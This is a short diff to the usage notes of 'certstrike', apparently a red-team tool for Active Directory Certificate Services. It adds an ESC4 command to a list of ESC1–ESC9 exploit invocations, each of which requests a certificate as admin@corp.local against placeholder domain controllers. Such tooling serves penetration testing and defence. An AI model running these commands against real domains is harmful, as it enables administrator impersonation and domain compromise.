@@ -65,6 +65,7 @@ certstrike pki --enum --target-dc dc01 --domain corp.local -u user -p pass
 certstrike pki --exploit esc1 --template Vuln --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
 certstrike pki --exploit esc2 --template AnyPurpose --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
 certstrike pki --exploit esc3 --template EnrollAgent --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
+certstrike pki --exploit esc4 --template WritableTemplate --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
 certstrike pki --exploit esc6 --template AnyTemplate --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
 certstrike pki --exploit esc7 --ca CorpCA --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
 certstrike pki --exploit esc9 --template NoSecExt --upn admin@corp.local --attacker-dn "CN=..." --target-dc dc01 --domain corp.local -u user -p pass
